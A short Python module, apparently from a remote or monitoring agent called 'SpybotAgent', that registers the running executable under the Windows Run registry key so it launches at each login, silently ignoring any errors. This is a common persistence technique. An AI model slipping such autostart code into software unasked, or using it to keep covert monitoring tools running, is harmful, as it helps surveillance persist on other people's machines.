import os
import sys

from config import AGENT_NAME


def add_to_startup() -> bool:
    try:
        import winreg
    except ImportError:
        return False

    exe_path = os.path.realpath(sys.executable)
    app_name = f"SpybotAgent_{AGENT_NAME}"
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False
